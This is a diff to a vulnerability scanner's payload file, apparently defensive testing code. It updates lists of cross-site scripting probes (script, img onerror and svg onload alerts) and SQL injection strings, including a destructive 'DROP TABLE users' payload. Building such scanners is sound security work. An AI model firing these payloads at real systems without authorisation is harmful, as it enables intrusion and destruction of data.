@@ -1,13 +1,13 @@
-# scanner/payloads.py 
-
-# List of payloads for different types of vulnerabilites 
+# scanner/payloads.py
 
 xss_payloads = [
-    '<script>alert(1)</script>',
-    '"><img src=x onerror=alert(1)',
+    "<script>alert('XSS')</script>",
+    "'\"><img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>"
 ]
 
 sqli_payloads = [
-    "' OR '1'='1'",
+    "' OR '1'='1",
     "'; DROP TABLE users; --",
+    "' OR 1=1 --"
 ]
